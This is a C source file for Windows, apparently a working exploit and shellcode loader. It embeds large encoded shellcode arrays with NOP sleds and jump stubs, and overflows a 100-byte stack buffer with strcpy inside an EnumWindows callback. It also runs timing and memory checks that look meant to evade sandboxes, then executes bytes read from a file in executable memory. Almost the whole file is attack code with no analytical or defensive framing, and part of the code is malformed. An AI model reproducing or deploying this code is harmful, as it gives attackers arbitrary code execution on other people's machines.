#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>
#include <stdint.h>
#include <x86intrin.h>
#include <psapi.h>
//#pragma intrinsic(__rdtsc)
#pragma comment( lib, "psapi.lib" )


HMODULE hinstDLL;

//release version
//char buff1[] = "\x90\x90\x90\x90\xda\xd5\xb8\xf7\x34\xcf\xb6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x83\x83\xc2\x04\x31\x42\x15\x03\x42\x15\x15\xc1\x70\xa2\x91\xfe\xc7\x11\xe2\x26\xa3\x81\x10\x85\x67\x03\x69\x4a\x49\xee\x9c\xb0\xd4\x05\x1d\x73\x22\xc4\xc0\x8e\x8f\x05\x81\x9e\x4f\x4c\xcf\xe1\x4b\xfd\xfc\xba\x26\xea\xbf\x97\x63\xf3\xfd\x7d\xe5\x96\xf2\xe7\x15\x0f\xe2\x0a\x21\x7f\x12\xe8\xa8\xbe\x7c\x1f\xf6\xe9\x89\x54\x24\x22\x9a\x82\xb3\x40\x55\x96\xc3\x94\xde\x42\xf9\xa5\x69\x02\x89\x79\x4a\x04\xaa\x9d\xd4\x2a\x1a\xc9\x5e\x84\x1e\xba\x55\x73\x32\x54\x6f\xed\x81\x0f\x3b\x80\x42\xf5\xbb\x0a\x8f\xd5\x0b\xc1\xd0\xa9\xaf\x2d\x9c\x85\x66\x70\xb7\x23\x35\x64\xb7\x88\xb5\x26\x48\xb1\xc1\x29\xb1\xae\xfe\x63\xa3\x19\x13\xda\x2f\x4c\x41\x93\x33\x07\x24\x0e\xee\xbc\x67\x65\x0c\x94\x0e\x08\xbc\x89\x3f\xa7\x03\xca\xe4\x13\x88\xad\xae\x65\x09\x43\x5c\x64\x79\xb8\xc6\xb7\xa8\xf2\xa0\x9a\x36\x26\x61\x90\x08\x2a\x8b\xea\x2e\x8d\xa9\x5d\x6e\x16\x67\xdf\xfe\xc4\x3c\x44\xc8\x66\x49\x30\x18\x99\xb6\x2e\x5f\x9b\x12\xfb\x05\x16\x7d\x95\xdb\x57\x52\xb6\xd9\xde\xfc\xf4\x6c\xcf\x14\x6f\x9d\xd2\x04\x93\xab\xfc\x5e\x3c\xb3\xeb\x5f\x31\xf4\x71\xc3\x84\x28\x9e\xf3\xb5\x6a\x40\xaa\x49\x45\x7a\x8c\xec\xb1\x5a\xf8\xc7\x94\xe8\x25\xeb\xd3\xf1\xee\x28\x7a\x08\x18\x47\xad\x54\x70\x76\x38\xc2\x22\x19\x49\xf0\x4c\x3d\x0d\x3a\x94\x3b\xc7\x31\x76\x11\x79\x20\xe2\x65\x51\xde\xe3\xbe\x97\x41\xb6\x84\x98\x5f\x16\xea\x6a\x32\x10\x01\x75\x27\x23\x55\x94\x1e\x92\x78\x17\x10\x38\x53\x52\x06\x1b\xdc\x4c\x28\xb4\xea\x96\x3d\x83\xd8\xe1\x88\x5d\x2a\x0f\x91\x96\xc9\x12\x93\xaa\x57\x4c\xc2\xf5\x34\x32\x2b\x21\x48\xad\x2d\x40\xe8\x1e\x82\x27\x39\x90\xb0\x02\x60\x68\x7e\x05\xa5\x0b\x18\xa3\x82\x21\x07\xdf\x35\x94\x21\x30\xd5\xd5\x9e\xbd\x86\xcd\x3d\xb5\x0c\x26\xd5\x9e\x60\x79\x32\xf6\xac\x60\x0e\x40\x5b\xd2\xca\xa4\x95\x03\x98\xef\x16\x9c\x40\x52\x3b\x31\x89\xee\x64\xe2\x06\x75\xe1\x66\x72\x43\xe7\xcc\x40\xfc\x2e\x4f\x76\x50\xee\x05\xdf\x8b\x15\x57\x18\x76\xf4\xc9\xf0\xfe\xec\xe6\x5d\x81\x50\x01\x7a\xc5\x85\x29\x30\x0e\x1c\x1d\x4f\x85\x5a\x94\xf4\xfb\x93\x35\xf6\xec\x59\x55\x3c\x94\x7f\xe6\x2c\x71\x6f\x98\xe8\x31\x20\xf7\x62\x45\x0d\xac\x64\xde\x08\x13\x2e\xe9\xc6\xb5\x63\x50\x1e\xa6\xbb\xe2\xde\xce\x19\x10\xa8\x4e\x5f\x5c\xf1\x3e\x71\x11\xbd\x6b\x02\x73\x34\x41\x73\x35\x41\x73\x36\x41\x73\x37\x41\x73\x38\x41\x73\x39\x41\x74\x30\x41\x74\x31\x41\x74\x32\x41\x74\x33\x41\x74\x34\x41\x74\x35\x41\x74\x36\x41\x74\x37\x41\x74\x38\x41\x74\x39\x41\x75\x30\x41\x75\x31\x41\x75\x32\x41\x75\x33\x41\x75\x34\x41\x75\x35\x41\x75\x36\x41\x75\x37\x41\x75\x38\x41\x75\x39\x41\x76\x30\x41\x76\x31\x41\x76\x32\x41\x76\x33\x41\x76\x34\x41\x76\x35\x41\x76\x36\x41\x76\x37\x41\x76\x38\x41\x76\x39\x41\x77\x30\x41\x77\x31\x41\x77\x32\x41\x77\x33\x41\x77\x34\x41\x77\x35\x41\x77\x36\x41\x77\x37\x41\x77\x38\x41\x77\x39\x41\x78\x30\x41\x78\x31\x41\x78\x32\x41\x78\x33\x41\x78\x34\x41\x78\x35\x41\x78\x36\x41\x78\x37\x41\x78\x38\x41\x78\x39\x41\x79\x30\x41\x79\x31\x41\x79\x32\x41\x79\x33\x41\x79\x34\x41\x79\x35\x41\x79\x36\x41\x79\x37\x41\x79\x38\x41\x79\x39\x41\x7A\x30\x41\x7A\x31\x41\x7A\x32\x41\x7A\x33\x41\x7A\x34\x41\x7A\x35\x41\x7A\x36\x41\x7A\x37\x41\x7A\x38\x41\x7A\x39\x42\x61\x30\x42\x61\x31\x42\x61\x32\x42\x61\x33\x42\x61\x34\x42\x61\x35\x42\x61\x36\x42\x61\x37\x42\x61\x38\x42\x61\x39\x42\x62\x30\x42\x62\x31\x42\x62\x32\x42\x62\x33\x42\x62\x34\x42\x62\x35\x42\x62\x36\x42\x62\x37\x42\x62\x38\x42\x62\x39\x42\x63\x30\x42\x63\x31\x42\x63\x32\x42\x63\x33\x42\x63\x34\x42\x63\x35\x42\x63\x36\x42\x63\x37\x42\x63\x38\x42\x63\x39\x42\x64\x30\x42\x64\x31\x42\x64\x32\x42\x64\x33\x42\x64\x34\x42\x64\x35\x42\x64\x36\x42\x64\x37\x42\x64\x38\x42\x64\x39\x42\x65\x30\x90\x90\x90\x90\x90\x90\x90\xE9\x6D\xFC\xFF\xFF\x90\xEB\xF8\x90\x90\x39\x6A\x60\x69\x90\x90\xE9\x70\xFC\xFF\xFF\x90\xEB\xF8\x90\x90\x39\x6A\x60\x69\x66\x33\x42\x66\x34\x42\x66\x35\x42\x66\x36\x42\x66\x37\x42\x66\x38\x42\x66\x39\x42\x67\x30\x42\x67\x31\x42\x67\x32\x42\x67\x33\x42\x67\x34\x42\x67\x35\x42\x67\x36\x42\x67\x37\x42\x67\x38\x42\x67\x39\x42\x68\x30\x42\x68\x31\x42\x68\x32\x42";


//debug version
char buff1[] = "\x90\x90\x90\x90\xda\xd5\xb8\xf7\x34\xcf\xb6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x83\x83\xc2\x04\x31\x42\x15\x03\x42\x15\x15\xc1\x70\xa2\x91\xfe\xc7\x11\xe2\x26\xa3\x81\x10\x85\x67\x03\x69\x4a\x49\xee\x9c\xb0\xd4\x05\x1d\x73\x22\xc4\xc0\x8e\x8f\x05\x81\x9e\x4f\x4c\xcf\xe1\x4b\xfd\xfc\xba\x26\xea\xbf\x97\x63\xf3\xfd\x7d\xe5\x96\xf2\xe7\x15\x0f\xe2\x0a\x21\x7f\x12\xe8\xa8\xbe\x7c\x1f\xf6\xe9\x89\x54\x24\x22\x9a\x82\xb3\x40\x55\x96\xc3\x94\xde\x42\xf9\xa5\x69\x02\x89\x79\x4a\x04\xaa\x9d\xd4\x2a\x1a\xc9\x5e\x84\x1e\xba\x55\x73\x32\x54\x6f\xed\x81\x0f\x3b\x80\x42\xf5\xbb\x0a\x8f\xd5\x0b\xc1\xd0\xa9\xaf\x2d\x9c\x85\x66\x70\xb7\x23\x35\x64\xb7\x88\xb5\x26\x48\xb1\xc1\x29\xb1\xae\xfe\x63\xa3\x19\x13\xda\x2f\x4c\x41\x93\x33\x07\x24\x0e\xee\xbc\x67\x65\x0c\x94\x0e\x08\xbc\x89\x3f\xa7\x03\xca\xe4\x13\x88\xad\xae\x65\x09\x43\x5c\x64\x79\xb8\xc6\xb7\xa8\xf2\xa0\x9a\x36\x26\x61\x90\x08\x2a\x8b\xea\x2e\x8d\xa9\x5d\x6e\x16\x67\xdf\xfe\xc4\x3c\x44\xc8\x66\x49\x30\x18\x99\xb6\x2e\x5f\x9b\x12\xfb\x05\x16\x7d\x95\xdb\x57\x52\xb6\xd9\xde\xfc\xf4\x6c\xcf\x14\x6f\x9d\xd2\x04\x93\xab\xfc\x5e\x3c\xb3\xeb\x5f\x31\xf4\x71\xc3\x84\x28\x9e\xf3\xb5\x6a\x40\xaa\x49\x45\x7a\x8c\xec\xb1\x5a\xf8\xc7\x94\xe8\x25\xeb\xd3\xf1\xee\x28\x7a\x08\x18\x47\xad\x54\x70\x76\x38\xc2\x22\x19\x49\xf0\x4c\x3d\x0d\x3a\x94\x3b\xc7\x31\x76\x11\x79\x20\xe2\x65\x51\xde\xe3\xbe\x97\x41\xb6\x84\x98\x5f\x16\xea\x6a\x32\x10\x01\x75\x27\x23\x55\x94\x1e\x92\x78\x17\x10\x38\x53\x52\x06\x1b\xdc\x4c\x28\xb4\xea\x96\x3d\x83\xd8\xe1\x88\x5d\x2a\x0f\x91\x96\xc9\x12\x93\xaa\x57\x4c\xc2\xf5\x34\x32\x2b\x21\x48\xad\x2d\x40\xe8\x1e\x82\x27\x39\x90\xb0\x02\x60\x68\x7e\x05\xa5\x0b\x18\xa3\x82\x21\x07\xdf\x35\x94\x21\x30\xd5\xd5\x9e\xbd\x86\xcd\x3d\xb5\x0c\x26\xd5\x9e\x60\x79\x32\xf6\xac\x60\x0e\x40\x5b\xd2\xca\xa4\x95\x03\x98\xef\x16\x9c\x40\x52\x3b\x31\x89\xee\x64\xe2\x06\x75\xe1\x66\x72\x43\xe7\xcc\x40\xfc\x2e\x4f\x76\x50\xee\x05\xdf\x8b\x15\x57\x18\x76\xf4\xc9\xf0\xfe\xec\xe6\x5d\x81\x50\x01\x7a\xc5\x85\x29\x30\x0e\x1c\x1d\x4f\x85\x5a\x94\xf4\xfb\x93\x35\xf6\xec\x59\x55\x3c\x94\x7f\xe6\x2c\x71\x6f\x98\xe8\x31\x20\xf7\x62\x45\x0d\xac\x64\xde\x08\x13\x2e\xe9\xc6\xb5\x63\x50\x1e\xa6\xbb\xe2\xde\xce\x19\x10\xa8\x4e\x5f\x5c\xf1\x3e\x71\x11\xbd\x6b\x02\x73\x34\x41\x73\x35\x41\x73\x36\x41\x73\x37\x41\x73\x38\x41\x73\x39\x41\x74\x30\x41\x74\x31\x41\x74\x32\x41\x74\x33\x41\x74\x34\x41\x74\x35\x41\x74\x36\x41\x74\x37\x41\x74\x38\x41\x74\x39\x41\x75\x30\x41\x75\x31\x41\x75\x32\x41\x75\x33\x41\x75\x34\x41\x75\x35\x41\x75\x36\x41\x75\x37\x41\x75\x38\x41\x75\x39\x41\x76\x30\x41\x76\x31\x41\x76\x32\x41\x76\x33\x41\x76\x34\x41\x76\x35\x41\x76\x36\x41\x76\x37\x41\x76\x38\x41\x76\x39\x41\x77\x30\x41\x77\x31\x41\x77\x32\x41\x77\x33\x41\x77\x34\x41\x77\x35\x41\x77\x36\x41\x77\x37\x41\x77\x38\x41\x77\x39\x41\x78\x30\x41\x78\x31\x41\x78\x32\x41\x78\x33\x41\x78\x34\x41\x78\x35\x41\x78\x36\x41\x78\x37\x41\x78\x38\x41\x78\x39\x41\x79\x30\x41\x79\x31\x41\x79\x32\x41\x79\x33\x41\x79\x34\x41\x79\x35\x41\x79\x36\x41\x79\x37\x41\x79\x38\x41\x79\x39\x41\x7A\x30\x41\x7A\x31\x41\x7A\x32\x41\x7A\x33\x41\x7A\x34\x41\x7A\x35\x41\x7A\x36\x41\x7A\x37\x41\x7A\x38\x41\x7A\x39\x42\x61\x30\x42\x61\x31\x42\x61\x32\x42\x61\x33\x42\x61\x34\x42\x61\x35\x42\x61\x36\x42\x61\x37\x42\x61\x38\x42\x61\x39\x42\x62\x30\x42\x62\x31\x42\x62\x32\x42\x62\x33\x42\x62\x34\x42\x62\x35\x42\x62\x36\x42\x62\x37\x42\x62\x38\x42\x62\x39\x42\x63\x30\x42\x63\x31\x42\x63\x32\x42\x63\x33\x42\x63\x34\x42\x63\x35\x42\x63\x36\x42\x63\x37\x42\x63\x38\x42\x63\x39\x42\x64\x30\x42\x64\x31\x42\x64\x32\x42\x64\x33\x42\x64\x34\x42\x64\x35\x42\x64\x36\x42\x64\x37\x42\x64\x38\x42\x64\x39\x42\x65\x30\x42\x65\x31\x42\x65\x32\x42\x65\x33\x42\x65\x34\x42\x65\x35\x42\x65\x36\x42\x65\x90\x90\x90\xE9\x61\xFC\xFF\xFF\x90\xEB\xF8\x90\x90\x39\x6A\x60\x69\x66\x33\x42\x66\x34\x42\x66\x35\x42\x66\x36\x42\x66\x37\x42\x66\x38\x42\x66\x39\x42\x67\x30\x42\x67\x31\x42\x67\x32\x42\x67\x33\x42\x67\x34\x42\x67\x35\x42\x67\x36\x42\x67\x37\x42\x67\x38\x42\x67\x39\x42\x68\x30\x42\x68\x31\x42\x68\x32\x42";




BOOL CALLBACK enumWindowsProc(HWND hWnd,LPARAM lParam)
{
char buff[100] = {0};
//char buff1[] = "\x90\x90\x90\x90\xda\xcc\xba\xa1\x75\x2d\x7a\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x4b\x83\xed\xfc\x31\x55\x16\x03\x55\x16\xe2\x54\x89\xc5\xf8\x96\x72\x16\x9d\x1f\x97\x27\x9d\x7b\xd3\x18\x2d\x08\xb1\x94\xc6\x5c\x22\x2e\xaa\x48\x45\x87\x01\xae\x68\x18\x39\x92\xeb\x9a\x40\xc6\xcb\xa3\x8a\x1b\x0d\xe3\xf7\xd1\x5f\xbc\x7c\x47\x70\xc9\xc9\x5b\xfb\x81\xdc\xdb\x18\x51\xde\xca\x8e\xe9\xb9\xcc\x31\x3d\xb2\x45\x2a\x22\xff\x1c\xc1\x90\x8b\x9f\x03\xe9\x74\x33\x6a\xc5\x86\x4a\xaa\xe2\x78\x39\xc2\x10\x04\x39\x11\x6a\xd2\xcc\x82\xcc\x91\x76\x6f\xec\x76\xe0\xe4\xe2\x33\x67\xa2\xe6\xc2\xa4\xd8\x13\x4e\x4b\x0f\x92\x14\x6f\x8b\xfe\xcf\x0e\x8a\x5a\xa1\x2f\xcc\x04\x1e\x95\x86\xa9\x4b\xa4\xc4\xa7\x8a\x3b\x73\x85\x8d\x43\x7c\xba\xe5\x72\xf7\x55\x71\x8b\xd2\x11\x8d\xc6\x7f\x33\x06\x8e\x15\x01\x4b\x31\xc0\x46\x72\xb1\xe1\x36\x81\xa9\x83\x33\xcd\x6e\x7f\x4e\x5e\x1a\x7f\xfd\x5f\x0f\x1c\x6c\xc4\x81\x86\x16\x61\xfd\x67\x84\x49\x9f\x1e\x3e\xf9\x3e\x85\xd3\x94\xae\x65\x03\x13\x5c\x07\x35\xa8\xc6\xa2\xbb\x6e\x29\x49\x53\x18\x5b\xfd\xc4\x87\xc7\xdd\x35\x38\x75\x77\x25\xca\x10\xf3\xc0\x0a\xaa\xb2\x75\x03\x0a\x2d\x0e\xe7\x3a\x97\xc1\x28\xd9\xd7\x73\x01\x6f\x79\xf8\x1e\xa1\x0c\x73\xce\xdc\xce\x56\x64\x7b\x62\xe9\xa1\xdf\x1d\x27\xcf\xa7\xb8\x09\x61\x22\x2f\x56\x5b\xec\xdc\xe2\xc2\x9e\x56\x2b\x20\x2a\xf2\x46\x5a\xf7\xa0\xf9\xb4\x92\x20\x9f\xc8\x90\x90\xe9\xbd\xfc\xff\xff\x90\x90\x90\x90\x90\x90\x90\xEB\xF0\x90\x90\x39\x6A\x60\x69\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43";

hinstDLL = LoadLibrary("C:\\Windows\\System32\\esent97.dll");
if (hinstDLL)
{
strcpy(buff, buff1);
MessageBox(NULL, "Hello", "Exploit Not working", NULL);
printf("%s\n", buff);
system("pause");
exit(0);
}

}

int main(int argc, char *argv[])
{
DWORD dwBytesRead;
PROCESS_MEMORY_COUNTERS pmc;
unsigned long startTime_;
unsigned int diffInMilliseconds1;
char readBuffer[512];

void startTime()
{
  startTime_ = GetTickCount();
}

unsigned int calculateElapsedTime_()
{
    unsigned int diffInMilliseconds = GetTickCount() - startTime_;
    printf("%d", diffInMilliseconds);
    diffInMilliseconds1 = diffInMilliseconds;
    return diffInMilliseconds;
}

startTime();

Sleep(1000);

GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
   if(pmc.WorkingSetSize > 0x140000)
    {
        //printf("pmc %d \n", pmc.WorkingSetSize);
    if(calculateElapsedTime_() > 0x400) //release version
    //if(!(calculateElapsedTime_() > 0x1000 && diffInMilliseconds1<0x1100)) // debug version
        {

        HANDLE hFile = CreateFile("a.txt",GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

            if (hFile == INVALID_HANDLE_VALUE)
                {
                    printf("No Existing File!!!\n");
                    ExitProcess(0);
                }
            if (ReadFile(hFile,readBuffer, sizeof readBuffer, &dwBytesRead, NULL))
                {
                    readBuffer[dwBytesRead] = '\x00';
            //CloseHandle(hFile);
                    DWORD size = GetFileSize(hFile, NULL);

                    LPVOID pVirtualAlloc = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                    memcpy(pVirtualAlloc, readBuffer, size);

                    ((void (*)())pVirtualAlloc)();

                    VirtualFree(pVirtualAlloc, 0, MEM_RELEASE);



                    ExitProcess(0);
                }
            }
    }

//printf("pmc %d \n", pmc.WorkingSetSize);
//printf("%d", diffInMilliseconds1);
//printf("hello");
BOOL enumeratingWindowSucceeded = EnumWindows(enumWindowsProc, NULL); //exploitss

return 0;
}

/*  HANDLE hFile = CreateFile("a.txt",
                           GENERIC_READ,
                           0,
                           NULL,
                           OPEN_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL
               );

        if (hFile == INVALID_HANDLE_VALUE)
            {
            printf("No Existing File!!!\n");
            return -1;
            }
            if (ReadFile(hFile,readBuffer, sizeof readBuffer, &dwBytesRead, NULL))
                {
                readBuffer[dwBytesRead] = '\x00';
                CloseHandle(hFile);
                }


                */


//else
 //   {
 //   printf("No existing Library");
 //   return -1;
 //   }

//ParseString = (Ptr_function_)GetProcAddress(hinstDLL, "ParseString");
//ParseString(buff, readBuffer);



//tProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof pmc);
//Sleep(1000);

/*k = __rdtsc();
printf("%I64d ticks\n", k);
diff = k-i;

printf("%I64d ticks\n", diff);
*/
